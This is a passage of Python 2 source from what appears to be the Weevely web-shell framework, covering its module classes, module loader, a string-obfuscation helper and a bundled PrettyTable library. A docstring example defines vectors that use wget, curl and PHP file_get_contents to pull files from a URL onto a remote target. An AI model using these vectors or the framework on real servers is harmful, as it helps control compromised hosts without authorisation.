        self.name = '.'.join(self.__module__.split('.')[-2:])

        self._init_vectors()
        self._init_args()
        self._init_stored_args()
        
        self._set_vectors()
        self._set_args()
        
        self._init_session_args()
        
        self._init_module()
        
    def _init_vectors(self):
        """This method initialize VectorsDict objects self.vectors and 
        self.support_vectors.
        """
        self.vectors = VectorsDict(self.modhandler)
        self.support_vectors = VectorsDict(self.modhandler)

    def _init_args(self):
        """This method initialize ArgumentParser objects self.argparser.
        """
    
        self.argparser = ArgumentParser(prog=':%s' % self.name, description = self.__doc__, add_help=False)
        
        
    def run(self, arglist = []):
        """Main method called every module execution. It calls:
        
        . Check and set arguments (method _check_args(), do not inherit)
        . Optionally prepares the environment or formats the passed arguments to simplify vector run 
           (method _prepare(), inherition is optional)
        . Runs vectors and saves results  (method _probe(), inherition is mandatory)
        . Optionally verifies probe execution (method _verify(), inherition is optional)
        . Stringify self._result (method stringify_result(), inherition is optional)
        
        """
        
        self._result = ''
        self._output = ''

        try:
            self._check_args(arglist)
            self._prepare()
            self._probe()
            self._verify()
        except ProbeException as e:
            self.mprint('[!] Error: %s' % (e.error), 2, e.module) 
        except ProbeSucceed as e:
            self._stringify_result()
        except InitException, e:
            raise
        except ModuleException, e:
            module = self.name
            if e.module:
                module = e.module
            self.mprint('[!] Error: %s' % (e.error), 2, module) 
        else:
            self._stringify_result()
            
        
        return self._result, self._output

    def mprint(self, msg, msg_class = 3, module_name = None):
        """This method prints formatted warning messages.
        """
        
        if not self.modhandler.verbosity or msg_class <= self.modhandler.verbosity[-1]:
            if module_name == None:
                module_str = '[%s] ' % self.name
            elif module_name == '':
                module_str = ''
            else:
                module_str = '[%s] ' % module_name
                
            print module_str + str(msg)
        
            self.modhandler._last_warns += str(msg) + linesep
            
    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        
    def _init_session_args(self):
        
        # Get arguments from session, casting it if needed
        session_args = self.modhandler.sessions.get_session().get(self.name,{})
        self.stored_args_namespace.update(session_args)

    
    def _check_args(self, submitted_args):
        """This method parse and merge new arguments with stored arguments (assigned with :set)
        """
        namespace = copy.copy(self.stored_args_namespace)
        namespace.stored = False
        
        parsed_namespace = self.argparser.parse_args(submitted_args, namespace)
        self.args = vars(parsed_namespace)
        

    def _stringify_result(self):
        """This method try an automatic transformation from self._result object to self._output
        string. Variables self._result and self._output always contains last run results.
        """
        
        
        # Empty outputs. False is probably a good output value 
        if self._result != False and not self._result:
            self._output = ''
        # List outputs.
        elif isinstance(self._result, ListType):
            
            if len(self._result) > 0:
                
                columns_num = 1
                if isinstance(self._result[0], ListType):
                    columns_num = len(self._result[0])
                
                table = PrettyTable(['']*(columns_num))
                table.align = 'l'
                table.header = False
                
                for row in self._result:
                    if isinstance(row, ListType):
                        table.add_row(row)
                    else:
                        table.add_row([ row ])
            
                self._output = table.get_string()
                
        # Dict outputs are display as tables
        elif isinstance(self._result, DictType) and self._result:

            # Populate the rows
            randomitem = next(self._result.itervalues())
            if isinstance(randomitem, ListType):
                table = PrettyTable(['']*(len(randomitem)+1))
                table.align = 'l'
                table.header = False
                
                for field in self._result:
                    table.add_row([field] + self._result[field])
                
            else:
                table = PrettyTable(['']*2)
                table.align = 'l'
                table.header = False
                
                for field in self._result:
                    table.add_row([field, str(self._result[field])])
                

            self._output = table.get_string()
        # Else, try to stringify
        else:
            self._output = str(self._result)
        
        
    def store_args(self, submitted_args):
        
        # With no arguments, reset stored variables 
        if not submitted_args:
            self._init_stored_args()
            
        # Else, store them
        else:
            self.stored_args_namespace = self.argparser.parse_args(submitted_args, self.stored_args_namespace)
        
        
    def format_help(self, help = True, stored_args=True,  name = True, descr=True, usage=True, padding = 0):
        
        help_output = ''

        if help:
            help_output += '%s\n' % self.argparser.format_help()
        else:
            
            if name:
                help_output += '[%s]' % self.name
                
            if descr:
                if name: help_output += ' '
                help_output += '%s\n' %self.argparser.description
            
            if usage:
                help_output += '%s\n' % self.argparser.format_usage() 
    
        stored_args_help = self.format_stored_args()
        if stored_args and stored_args_help:
            help_output += 'stored arguments: %s\n' % stored_args_help.replace('\n', '\n' + ' '*(18))
            
        help_output = ' '*padding + help_output.replace('\n', '\n' + ' '*(padding)).rstrip(' ') 
            
        return help_output
        
                
    def format_stored_args(self):
    
        stringified_stored_args = ''
        
        for index, argument in enumerate(action.dest for action in self.argparser._actions if action.dest != 'help' ):
            value = self.stored_args_namespace[argument] if (argument in self.stored_args_namespace and self.stored_args_namespace[argument] != None) else ''
            stringified_stored_args += '%s=\'%s\' ' % (argument, value)
            
            if index+1 % 4 == 0:
                stringified_stored_args += '\n'
            
        return stringified_stored_args
        
    
########NEW FILE########
__FILENAME__ = moduleexception



class ModuleException(Exception):
    def __init__(self, module, value):
        self.module = module
        self.error = value
    def __str__(self):
        return '%s %s' % (self.module, self.error)

class ProbeException(ModuleException):
    pass

class ProbeSucceed(ModuleException):
    pass

class ExecutionException(ModuleException):
    pass

class InitException(ModuleException):
    pass
########NEW FILE########
__FILENAME__ = moduleguess
from core.moduleguessbase import ModuleGuessBase
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed

class ModuleGuess(ModuleGuessBase):
    '''Generic ModuleGuess class to inherit.

    ModuleGuess object is a dynamically loaded Weevely extension that automatically guess best
    way to accomplish tasks on remote target. Vector objects contains the code to run on remote target.
    
    To create a new module, define an object that inherit ModuleGuess (e.g. 'class MyModule(ModuleGuess)')
    into python file situated in 'modules/mygroup/mymodule.py'. Class needs the same name of the
    python file, with first capital letter.
    
    At first run (e.g. running ':mymgroup.mymodule' from terminal for the first time), module 
    constructor executes following main tasks:
        
        A) Defines module arguments (method _set_args(), inherition is recommended) 
        B) Defines module vectors (method _set_vectors(), inherition is recommended)
    
    At every call (e.g. at every ':mymgroup.mymodule' run) run() method parse passed
    arguments and execute following main tasks:
    
        1) Optionally prepares the environment (method _prepare(), inherition is optional)
        2) Runs every vector to guess best way to accomplish task. Guessing stops as soon as 
           first vector returns good results. Those three methods are executed for every vector:
           
           2.1) Formats the passed arguments to simplify current_vector run 
                (method _prepare_vector(), inherition is recommended)
           2.2) Runs current_vector and saves results  (method _execute_vector(), inherition is optional)
           2.3) Verifies probe execution (method  _verify_vector_execution(), inherition is optional)
        
        3) Optionally verifies probe execution (method _verify(), inherition is optional)

    Example of a basic module that download files from web into target:

    ==================================== webdownload.py ===================================

    from core.moduleguess import ModuleGuess
    from core.moduleexception import ProbeException, ProbeSucceed
    
    WARN_DOWNLOAD_OK = 'Downloaded succeed'
    
    class Webdownload(ModuleGuess):

        def _set_args(self):
        
            # Declare accepted module parameters. Let the user choose specific vector to skip guessing with
            # '-vector' parameter. Parameters passed at run are stored in self.args dictionary.
            
            self.argparser.add_argument('url')
            self.argparser.add_argument('rpath')
            self.argparser.add_argument('-vector', choices = self.vectors.keys())
            
    
        def _set_vectors(self):
            
            # Declare vectors to execute. 
            
            # Vectors defined in self.vectors are three diffent ways to accomplish tasks. 
            # They are execute in succession: the first vector that returns a positive 
            # results, break the probe. 
            
            # Vector defined in self.support_vectors are a support vectors executed manually.
            
            # Payload variable fields '$path' and '$url' are replaced at vector execution.
            # Because variable fields '$path' and '$url' corresponds with arguments,
            # is not necessary to inherit _prepare_vector() and _execute_vector().
            
            self.vectors.add_vector(name='putcontent', interpreter='shell.php', payloads = [ 'file_put_contents("$rpath", file_get_contents("$url"));' ])
            self.vectors.add_vector(name='wget', interpreter='shell.sh', payloads = [ 'wget $url -O $rpath' ])
            self.vectors.add_vector(name='curl', interpreter='shell.sh', payloads = [ 'curl -o $rpath $url' ])
            
            self.support_vectors.add_vector(name='check_download', interpreter='file.check', payloads = [ '$rpath', 'exists' ])

        def  _verify_vector_execution(self):
       
           # Verify downloaded file. Save vector return value in self._result and eventually raise 
           # ProbeSucceed to stop module execution and print error message. If not even one vector
           # raise a ProbeSucceed/ProbeException to break the flow, the probe ends with an error
           # due to negative value of self._result.
    
           self._result = self.support_vectors.get('check_download').execute({ 'rpath' : self.args['rpath'] })
           
           if self._result == True:
               raise ProbeSucceed(self.name, WARN_DOWNLOAD_OK)
        
    =============================================================================
                
    '''

    def _set_vectors(self):
        """Inherit this method to add vectors in self.vectors and self.support_vectors lists, easily
        callable in _probe() function. This method is called by module constructor. 
        Example of vector declaration:
        
        > self.support_vectors.add_vector(name='vector_name', interpreter='module_name', payloads = [ 'module_param1', '$module_param2', .. ])
        
        Template fields like '$rpath' are replaced at vector execution.
        
        """
        
        pass
    
    def _set_args(self):
        """Inherit this method to set self.argparser arguments. Set new arguments following
        official python argparse documentation like. This method is called by module constructor.
        Arguments passed at module runs are stored in Module.args dictionary.
        """
        
        pass

    def _init_module(self):
        """Inherit this method to set eventual additional variables. Called by module constructor.
        """
    
    def _prepare(self):
        """Inherit this method to prepare environment for the probe.
        
        This method is called at every module run. Throws ModuleException, ProbeException.
        """
        
        pass        

    def _prepare_vector(self):
        """Inherit this method to prepare properly self.formatted_arguments for the
        self.current_vector execution. 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        self.formatted_args = self.args
        
    def _execute_vector(self):
        """This method execute self.current_vector. Is recommended to avoid inherition
        to prepare properly arguments with self.formatted_args in ModuleGuess._prepare_vector(). 
        
        Vector execution results should be stored in self._result. 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        self._result = self.current_vector.execute(self.formatted_args)
    
    def _verify_vector_execution(self):
        """This method verify vector execution results. Is recommended to
        does not inherit this method but just fill properly self._result in 
        ModuleGuess._execute_vector(). 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        # If self._result is set. False is probably a good return value.
        if self._result or self._result == False:
            raise ProbeSucceed(self.name,'Command succeeded')
     
    def _verify(self):
        """Inherit this method to check probe result.
        
        Results to print and return after moudule execution should be stored in self._result.
        It is called at every module run. Throws ModuleException, ProbeException, ProbeSucceed.         
        """
        pass    
########NEW FILE########
__FILENAME__ = moduleguessbase
from core.module import Module
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed

class ModuleGuessBase(Module):

    def _probe(self):
        
        vectors = []
        
        if 'vector' in self.args and self.args['vector']:
            selected_vector = self.vectors.get(self.args['vector'])
            if selected_vector:
                vectors = { self.args['vector'] : selected_vector }
        else:
            vectors = self.vectors
            
            
        try:
            
            for vector in vectors.values():
                
                try:
                    self.current_vector = vector
                    self.formatted_args = {}
                    
                    self._prepare_vector()
                    self._execute_vector()
                    self._verify_vector_execution()
                    
                except ProbeSucceed, e:
                    setattr(self.stored_args_namespace, 'vector' , self.current_vector.name)
                    raise
                except ExecutionException:
                    pass

        except ProbeException, e:
            raise ModuleException(self.name,  e.error)
        
        
    


########NEW FILE########
__FILENAME__ = modulehandler
import os,sys
from moduleexception import ModuleException
from core.sessions import Sessions, dirpath, rcfilepath
from helper import Helper


class ModHandler:


    def __init__(self, url = None, password = None, sessionfile=None):

        self.sessions = Sessions(url, password, sessionfile)

        self.set_url_pwd()

        self.interpreter = None
        self.modules_names_by_group = {}
        self.modules_classes = {}
        self.modules = {}

        self._guess_modules_path()
        self._load_modules_tree()

        self.verbosity=[ 3 ]
        
        self._last_warns = ''
        
    def set_url_pwd(self):
        self.url = self.sessions.get_session()['global']['url']
        self.password = self.sessions.get_session()['global']['password']        

    def _guess_modules_path(self):
    
    	try:
    		current_path = os.path.realpath( __file__ )
    		root_path = os.sep.join(current_path.split(os.sep)[:-2]) + os.sep
    		self.modules_path = root_path + 'modules'
    	except Exception, e :
    		raise Exception('Error finding module path: %s' % str(e))
    
        if not os.path.exists(self.modules_path):
            raise Exception( "No module directory %s found." % self.modules_path )
    


    def _load_modules_tree(self, startpath = None, recursive = True):

        if not startpath:
            startpath = self.modules_path

        for file_name in os.listdir(startpath):

            file_path = startpath + os.sep + file_name

            if os.path.isdir(file_path) and recursive:
                self._load_modules_tree(file_path, False)
            
            if os.path.isfile(file_path) and file_path.endswith('.py') and file_name != '__init__.py':
                
                module_name = '.'.join(file_path[:-3].split(os.sep)[-2:])
                mod = __import__('modules.' + module_name, fromlist = ["*"])
                classname = module_name.split('.')[-1].capitalize()
                
                if hasattr(mod, classname):
                    modclass = getattr(mod, classname)
                    self.modules_classes[module_name] = modclass
                
                    module_g, module_n = module_name.split('.')
                    if module_g not in self.modules_names_by_group:
                        self.modules_names_by_group[module_g] = []
                    self.modules_names_by_group[module_g].append(module_name)

        self.ordered_groups = self.modules_names_by_group.keys()
        self.ordered_groups.sort()


    def load(self, module_name):

        if module_name not in self.modules_classes.keys():
            raise ModuleException(module_name, "Module '%s' not found in path '%s'." % (module_name, self.modules_path) )  
        elif not module_name:
            module_name = self.interpreter
        elif not module_name in self.modules:
            self.modules[module_name]=self.modules_classes[module_name](self)

        
        return self.modules[module_name]


    def set_verbosity(self, v = None):

        if not v:
            if self.verbosity:
                self.verbosity.pop()
            else:
                self.verbosity = [ 3 ]
        else:
            self.verbosity.append(v)


########NEW FILE########
__FILENAME__ = pollution
# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

import base64, codecs
from core.utils import randstr
from random import random, randrange, choice, shuffle, randint

class Counter(dict):

    def __init__(self, iterable=None, **kwds):
        self.update(iterable, **kwds)

    def update(self, iterable=None, **kwds):
        if iterable is not None:
            if hasattr(iterable, 'iteritems'):
                if self:
                    self_get = self.get
                    for elem, count in iterable.iteritems():
                        self[elem] = self_get(elem, 0) + count
                else:
                    dict.update(self, iterable) # fast path when counter is empty
            else:
                self_get = self.get
                for elem in iterable:
                    self[elem] = self_get(elem, 0) + 1
        if kwds:
            self.update(kwds)

def pollute_with_random_str(str, charset = '!"#$%&()*-,./:<>?@[\]^_`{|}~', frequency=0.3):

	str_encoded = ''
	for char in str:
		if random() < frequency:
			str_encoded += randstr(1, True, charset) + char
		else:
			str_encoded += char
			
	return str_encoded
	
	
def pollute_replacing(str, charset = 'abcdefghijklmnopqrstuvwxyz'):
	
	# Choose common substring in str
	count = {}
	for r in range(1,len(str)):
		count.update( Counter(str[i:i+r] for i in range(len(str)-r-1)) )
	
	substr = choice(sorted(count, key=count.get, reverse=True)[:5])

	# Choose str to replace with
	pollution = find_randstr_not_in_str(str.replace(substr,''), charset)
			
	replacedstr = str.replace(substr,pollution)
	return substr, pollution, replacedstr

	
def find_randstr_not_in_str(str, charset):

	while True:

		pollution_chars = randstr(16, True, charset)
			
		pollution = ''
		found = False
		for i in range(0, len(pollution_chars)):
			pollution = pollution_chars[:i]
			if (not pollution in str) :
				found=True
				break
			
		if not found:
			print '[!] Bad randomization, retrying.'
		else:
			return pollution

	
		
	
	
def pollute_with_static_str(str, charset = 'abcdefghijklmnopqrstuvwxyz', frequency=0.1):

	pollution = find_randstr_not_in_str(str, charset)
		
	str_encoded = ''
	for char in str:
		if random() < frequency:
			str_encoded += pollution + char
		else:
			str_encoded += char
			
	return pollution, str_encoded

########NEW FILE########
__FILENAME__ = prettytable
#!/usr/bin/env python
#
# Copyright (c) 2009, Luke Maurits <luke@maurits.id.au>
# All rights reserved.
# With contributions from:
#  * Chris Clark
#  * Klein Stephane
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# * Redistributions of source code must retain the above copyright notice,
#   this list of conditions and the following disclaimer.
# * Redistributions in binary form must reproduce the above copyright notice,
#   this list of conditions and the following disclaimer in the documentation
#   and/or other materials provided with the distribution.
# * The name of the author may not be used to endorse or promote products
#   derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

__version__ = "0.6"

import sys
import copy
import random
import textwrap

py3k = sys.version_info[0] >= 3
if py3k:
    unicode = str
    basestring = str
    from html import escape
else:
    from cgi import escape

# hrule styles
FRAME = 0
ALL   = 1
NONE  = 2

# Table styles
DEFAULT = 10
MSWORD_FRIENDLY = 11
PLAIN_COLUMNS = 12
RANDOM = 20

def _get_size(text):
    max_width = 0
    max_height = 0
    text = _unicode(text)
    for line in text.split("\n"):
        max_height += 1
        if len(line) > max_width:
            max_width = len(line)

    return (max_width, max_height)
        
def _unicode(value, encoding="UTF-8"):
    if not isinstance(value, basestring):
        value = str(value)
    if not isinstance(value, unicode):
        value = unicode(value, encoding, "replace")
    return value

class PrettyTable(object):

    def __init__(self, field_names=None, **kwargs):

        """Return a new PrettyTable instance

        Arguments:

        field_names - list or tuple of field names
        fields - list or tuple of field names to include in displays
        start - index of first data row to include in output
        end - index of last data row to include in output PLUS ONE (list slice style)
        fields - names of fields (columns) to include
        header - print a header showing field names (True or False)
        border - print a border around the table (True or False)
        hrules - controls printing of horizontal rules after rows.  Allowed values: FRAME, ALL, NONE
	int_format - controls formatting of integer data
	float_format - controls formatting of floating point data
        padding_width - number of spaces on either side of column data (only used if left and right paddings are None)
        left_padding_width - number of spaces on left hand side of column data
        right_padding_width - number of spaces on right hand side of column data
        vertical_char - single character string used to draw vertical lines
        horizontal_char - single character string used to draw horizontal lines
        junction_char - single character string used to draw line junctions
        sortby - name of field to sort rows by
        sort_key - sorting key function, applied to data points before sorting
        reversesort - True or False to sort in descending or ascending order"""

        # Data
        self._field_names = []
        self._align = {}
        self._max_width = {}
        self._rows = []
        if field_names:
            self.field_names = field_names
        else:
            self._widths = []
        self._rows = []

        # Options
        self._options = "start end fields header border sortby reversesort sort_key attributes format hrules".split()
        self._options.extend("int_format float_format padding_width left_padding_width right_padding_width".split())
        self._options.extend("vertical_char horizontal_char junction_char".split())
        for option in self._options:
            if option in kwargs:
                self._validate_option(option, kwargs[option])
            else:
                kwargs[option] = None


        self._start = kwargs["start"] or 0
        self._end = kwargs["end"] or None
        self._fields = kwargs["fields"] or None

        self._header = kwargs["header"] or True
        self._border = kwargs["border"] or True
        self._hrules = kwargs["hrules"] or FRAME

        self._sortby = kwargs["sortby"] or None
        self._reversesort = kwargs["reversesort"] or False
        self._sort_key = kwargs["sort_key"] or (lambda x: x)

        self._int_format = kwargs["float_format"] or {}
        self._float_format = kwargs["float_format"] or {}
        self._padding_width = kwargs["padding_width"] or 1
        self._left_padding_width = kwargs["left_padding_width"] or None
        self._right_padding_width = kwargs["right_padding_width"] or None

        self._vertical_char = kwargs["vertical_char"] or "|"
        self._horizontal_char = kwargs["horizontal_char"] or "-"
        self._junction_char = kwargs["junction_char"] or "+"
        
        self._format = kwargs["format"] or False
        self._attributes = kwargs["attributes"] or {}
   
    def __getattr__(self, name):

        if name == "rowcount":
            return len(self._rows)
        elif name == "colcount":
            if self._field_names:
                return len(self._field_names)
            elif self._rows:
                return len(self._rows[0])
            else:
                return 0
        else:
            raise AttributeError(name)
 
    def __getitem__(self, index):

        newtable = copy.deepcopy(self)
        if isinstance(index, slice):
            newtable._rows = self._rows[index]
        elif isinstance(index, int):
            newtable._rows = [self._rows[index],]
        else:
            raise Exception("Index %s is invalid, must be an integer or slice" % str(index))
        return newtable

    def __str__(self):
        if py3k:
            return self.get_string()
        else:
            return self.get_string().encode("ascii","replace")

    def __unicode__(self):
        return self.get_string()

    ##############################
    # ATTRIBUTE VALIDATORS       #
    ##############################

    # The method _validate_option is all that should be used elsewhere in the code base to validate options.
    # It will call the appropriate validation method for that option.  The individual validation methods should
    # never need to be called directly (although nothing bad will happen if they *are*).
    # Validation happens in TWO places.
    # Firstly, in the property setters defined in the ATTRIBUTE MANAGMENT section.
    # Secondly, in the _get_options method, where keyword arguments are mixed with persistent settings

    def _validate_option(self, option, val):
        if option in ("start", "end", "padding_width", "left_padding_width", "right_padding_width", "format"):
            self._validate_nonnegative_int(option, val)
        elif option in ("sortby"):
            self._validate_field_name(option, val)
        elif option in ("sort_key"):
            self._validate_function(option, val)
        elif option in ("hrules"):
            self._validate_hrules(option, val)
        elif option in ("fields"):
            self._validate_all_field_names(option, val)
        elif option in ("header", "border", "reversesort"):
            self._validate_true_or_false(option, val)
        elif option in ("int_format"):
            self._validate_int_format(option, val)
        elif option in ("float_format"):
            self._validate_float_format(option, val)
        elif option in ("vertical_char", "horizontal_char", "junction_char"):
            self._validate_single_char(option, val)
        elif option in ("attributes"):
            self._validate_attributes(option, val)
        else:
            raise Exception("Unrecognised option: %s!" % option)

    def _validate_align(self, val):
        try:
            assert val in ["l","c","r"]
        except AssertionError:
            raise Exception("Alignment %s is invalid, use l, c or r!" % val)

    def _validate_nonnegative_int(self, name, val):
        try:
            assert int(val) >= 0
        except AssertionError:
            raise Exception("Invalid value for %s: %s!" % (name, _unicode(val)))

    def _validate_true_or_false(self, name, val):
        try:
            assert val in (True, False)
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be True or False." % name)

    def _validate_int_format(self, name, val):
        if val == "":
            return
        try:
            assert type(val) in (str, unicode)
            assert val.isdigit()
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be an integer format string." % name)

    def _validate_float_format(self, name, val):
        if val == "":
            return
        try:
            assert type(val) in (str, unicode)
            assert "." in val
            bits = val.split(".")
            assert len(bits) <= 2
            assert bits[0] == "" or bits[0].isdigit()
            assert bits[1] == "" or bits[1].isdigit()
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be a float format string." % name)

    def _validate_function(self, name, val):
        try:
            assert hasattr(val, "__call__")
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be a function." % name)

    def _validate_hrules(self, name, val):
        try:
            assert val in (ALL, FRAME, NONE)
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be ALL, FRAME or NONE." % name)

    def _validate_field_name(self, name, val):
        try:
            assert val in self._field_names
        except AssertionError:
            raise Exception("Invalid field name: %s!" % val)

    def _validate_all_field_names(self, name, val):
        try:
            for x in val:
                self._validate_field_name(name, x)
        except AssertionError:
            raise Exception("fields must be a sequence of field names!")

    def _validate_single_char(self, name, val):
        try:
            assert len(_unicode(val)) == 1
        except AssertionError:
            raise Exception("Invalid value for %s!  Must be a string of length 1." % name)

    def _validate_attributes(self, name, val):
        try:
            assert isinstance(val, dict)
        except AssertionError:
            raise Exception("attributes must be a dictionary of name/value pairs!")

    ##############################
    # ATTRIBUTE MANAGEMENT       #
    ##############################

    def _get_field_names(self):
        return self._field_names
        """The names of the fields

        Arguments:

        fields - list or tuple of field names"""
    def _set_field_names(self, val):
        if self._field_names:
            old_names = self._field_names[:]
        self._field_names = val
        if self._align and old_names:
            for old_name, new_name in zip(old_names, val):
                self._align[new_name] = self._align[old_name]
            for old_name in old_names:
                self._align.pop(old_name)
        else:
            for field in self._field_names:
                self._align[field] = "c"
    field_names = property(_get_field_names, _set_field_names)

    def _get_align(self):
        return self._align
    def _set_align(self, val):
        self._validate_align(val)
        for field in self._field_names:
            self._align[field] = val
    align = property(_get_align, _set_align)

    def _get_max_width(self):
        return self._max_width
    def _set_max_width(self, val):
        self._validate_nonnegativeint(val)
        for field in self._field_names:
            self._max_width[field] = val
    max_width = property(_get_max_width, _set_max_width)
    
    def _get_start(self):
        """Start index of the range of rows to print

        Arguments:

        start - index of first data row to include in output"""
        return self._start

    def _set_start(self, val):
        self._validate_option("start", val)
        self._start = val
    start = property(_get_start, _set_start)

    def _get_end(self):
        """End index of the range of rows to print

        Arguments:

        end - index of last data row to include in output PLUS ONE (list slice style)"""
        return self._end
    def _set_end(self, val):
        self._validate_option("end", val)
        self._end = val
    end = property(_get_end, _set_end)

    def _get_sortby(self):
        """Name of field by which to sort rows

        Arguments:

        sortby - field name to sort by"""
        return self._sortby
    def _set_sortby(self, val):
        self._validate_option("sortby", val)
        self._sortby = val
    sortby = property(_get_sortby, _set_sortby)

    def _get_reversesort(self):
        """Controls direction of sorting (ascending vs descending)

        Arguments:

        reveresort - set to True to sort by descending order, or False to sort by ascending order"""
        return self._reversesort
    def _set_reversesort(self, val):
        self._validate_option("reversesort", val)
        self._reversesort = val
    reversesort = property(_get_reversesort, _set_reversesort)

    def _get_sort_key(self):
        """Sorting key function, applied to data points before sorting

        Arguments:

        sort_key - a function which takes one argument and returns something to be sorted"""
        return self._sort_key
    def _set_sort_key(self, val):
        self._validate_option("sort_key", val)
        self._sort_key = val
    sort_key = property(_get_sort_key, _set_sort_key)
 
    def _get_header(self):
        """Controls printing of table header with field names

        Arguments:

        header - print a header showing field names (True or False)"""
        return self._header
    def _set_header(self, val):
        self._validate_option("header", val)
        self._header = val
    header = property(_get_header, _set_header)

    def _get_border(self):
        """Controls printing of border around table

        Arguments:

        border - print a border around the table (True or False)"""
        return self._border
    def _set_border(self, val):
        self._validate_option("border", val)
        self._border = val
    border = property(_get_border, _set_border)

    def _get_hrules(self):
        """Controls printing of horizontal rules after rows

        Arguments:

        hrules - horizontal rules style.  Allowed values: FRAME, ALL, NONE"""
        return self._hrules
    def _set_hrules(self, val):
        self._validate_option("hrules", val)
        self._hrules = val
    hrules = property(_get_hrules, _set_hrules)

    def _get_int_format(self):
        """Controls formatting of integer data
        Arguments:

        int_format - integer format string"""
        return self._int_format
    def _set_int_format(self, val):
        self._validate_option("int_format", val)
        for field in self._field_names:
            self._int_format[field] = val
    int_format = property(_get_int_format, _set_int_format)

    def _get_float_format(self):
        """Controls formatting of floating point data
        Arguments:

        float_format - floating point format string"""
        return self._float_format
    def _set_float_format(self, val):
        self._validate_option("float_format", val)
        for field in self._field_names:
            self._float_format[field] = val
    float_format = property(_get_float_format, _set_float_format)

    def _get_padding_width(self):
        """The number of empty spaces between a column's edge and its content

        Arguments:

        padding_width - number of spaces, must be a positive integer"""
        return self._padding_width
    def _set_padding_width(self, val):
        self._validate_option("padding_width", val)
        self._padding_width = val
    padding_width = property(_get_padding_width, _set_padding_width)

    def _get_left_padding_width(self):
        """The number of empty spaces between a column's left edge and its content

        Arguments:

        left_padding - number of spaces, must be a positive integer"""
        return self._left_padding_width
    def _set_left_padding_width(self, val):
        self._validate_option("left_padding_width", val)
        self._left_padding_width = val
    left_padding_width = property(_get_left_padding_width, _set_left_padding_width)

    def _get_right_padding_width(self):
        """The number of empty spaces between a column's right edge and its content

        Arguments:

        right_padding - number of spaces, must be a positive integer"""
        return self._right_padding_width
    def _set_right_padding_width(self, val):
        self._validate_option("right_padding_width", val)
        self._right_padding_width = val
    right_padding_width = property(_get_right_padding_width, _set_right_padding_width)

    def _get_vertical_char(self):
        """The charcter used when printing table borders to draw vertical lines

        Arguments:

        vertical_char - single character string used to draw vertical lines"""
        return self._vertical_char
    def _set_vertical_char(self, val):
        self._validate_option("vertical_char", val)
        self._vertical_char = val
    vertical_char = property(_get_vertical_char, _set_vertical_char)

    def _get_horizontal_char(self):
        """The charcter used when printing table borders to draw horizontal lines

        Arguments:

        horizontal_char - single character string used to draw horizontal lines"""
        return self._horizontal_char
    def _set_horizontal_char(self, val):
        self._validate_option("horizontal_char", val)
        self._horizontal_char = val
    horizontal_char = property(_get_horizontal_char, _set_horizontal_char)

    def _get_junction_char(self):
        """The charcter used when printing table borders to draw line junctions

        Arguments:

        junction_char - single character string used to draw line junctions"""
        return self._junction_char
    def _set_junction_char(self, val):
        self._validate_option("vertical_char", val)
        self._junction_char = val
    junction_char = property(_get_junction_char, _set_junction_char)

    def _get_format(self):
        """Controls whether or not HTML tables are formatted to match styling options

        Arguments:

        format - True or False"""
        return self._format
    def _set_format(self, val):
        self._validate_option("format", val)
        self._format = val
    format = property(_get_format, _set_format)

    def _get_attributes(self):
        """A dictionary of HTML attribute name/value pairs to be included in the <table> tag when printing HTML

        Arguments:

        attributes - dictionary of attributes"""
        return self._attributes
    def _set_attributes(self, val):
        self.validate_option("attributes", val)
        self._attributes = val
    attributes = property(_get_attributes, _set_attributes)

    ##############################
    # OPTION MIXER               #
    ##############################

    def _get_options(self, kwargs):

        options = {}
        for option in self._options:
            if option in kwargs:
                self._validate_option(option, kwargs[option])
                options[option] = kwargs[option]
            else:
                options[option] = getattr(self, "_"+option)
        return options

    ##############################
    # PRESET STYLE LOGIC         #
    ##############################

    def set_style(self, style):

        if style == DEFAULT:
            self._set_default_style()
        elif style == MSWORD_FRIENDLY:
            self._set_msword_style()
        elif style == PLAIN_COLUMNS:
            self._set_columns_style()
        elif style == RANDOM:
            self._set_random_style()
        else:
